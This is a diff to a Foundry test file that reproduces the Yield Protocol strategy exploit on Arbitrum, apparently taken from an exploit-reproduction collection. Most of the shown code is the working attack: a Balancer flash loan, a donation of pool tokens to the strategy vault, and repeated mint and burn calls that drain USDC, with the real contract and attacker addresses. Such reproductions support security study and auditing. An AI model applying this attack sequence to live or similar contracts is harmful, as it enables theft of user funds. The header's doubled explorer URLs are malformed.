@@ -3,6 +3,9 @@ pragma solidity ^0.8.15;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+import {IBalancerVault} from "src/interfaces/IBalancerVault.sol";
+
 // @KeyInfo - Total Lost : 181K
 // Attacker : https://arbiscan.io/address/https://arbiscan.io/address/0x1abe06f451e2d569b3e9123baf33b51f68878656
 // Attack Contract : https://arbiscan.io/address/https://arbiscan.io/address/0xd775fd7b76424a553e4adce6c2f99be419ce8d41
@@ -18,7 +21,6 @@ import "forge-std/Test.sol";
 // Hacking God : https://medium.com/immunefi/yield-protocol-logic-error-bugfix-review-7b86741e6f50
 
 interface IYieldStrategy is IERC20 {
-
     function mint(address to) external returns (uint256);
 
     function burn(address to) external returns (uint256);
@@ -26,15 +28,16 @@ interface IYieldStrategy is IERC20 {
     function mintDivested(address to) external returns (uint256);
 
     function burnDivested(address to) external returns (uint256);
-
 }
 
 contract Yield is Test {
-
     uint256 blocknumToForkFrom = 206_219_811;
-    IYieldStrategy YieldStrategy_1 = IYieldStrategy(0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa); // pool token
-    IYieldStrategy YieldStrategy_2 = IYieldStrategy(0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47); // strategy token valut
-    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    IYieldStrategy YieldStrategy_1 =
+        IYieldStrategy(0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa); // pool token
+    IYieldStrategy YieldStrategy_2 =
+        IYieldStrategy(0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47); // strategy token valut
+    IBalancerVault Balancer =
+        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
 
     function setUp() public {
@@ -56,7 +59,9 @@ contract Yield is Test {
 
         // Log balances after exploit
         emit log_named_decimal_uint(
-            " Attacker USDC Balance After exploit", USDC.balanceOf(address(this)), USDC.decimals()
+            " Attacker USDC Balance After exploit",
+            USDC.balanceOf(address(this)),
+            USDC.decimals()
         );
     }
 
@@ -73,16 +78,21 @@ contract Yield is Test {
         YieldStrategy_1.transfer(address(YieldStrategy_2), transferAmount);
         YieldStrategy_2.mint(address(YieldStrategy_2)); // mint strategy token
 
-        YieldStrategy_1.transfer(address(YieldStrategy_2), YieldStrategy_1.balanceOf(address(this))); // donate pool token to strategy token vault
+        YieldStrategy_1.transfer(
+            address(YieldStrategy_2),
+            YieldStrategy_1.balanceOf(address(this))
+        ); // donate pool token to strategy token vault
         YieldStrategy_2.burn(address(this)); // burn strategy token to get pool token
 
         YieldStrategy_2.mint(address(YieldStrategy_2)); // recover donated pool token
         YieldStrategy_2.burn(address(this));
 
-        YieldStrategy_1.transfer(address(YieldStrategy_1), YieldStrategy_1.balanceOf(address(this)));
+        YieldStrategy_1.transfer(
+            address(YieldStrategy_1),
+            YieldStrategy_1.balanceOf(address(this))
+        );
         YieldStrategy_1.burnDivested(address(this)); // burn pool token to USDC
 
         USDC.transfer(address(Balancer), amounts[0]);
     }
-
 }
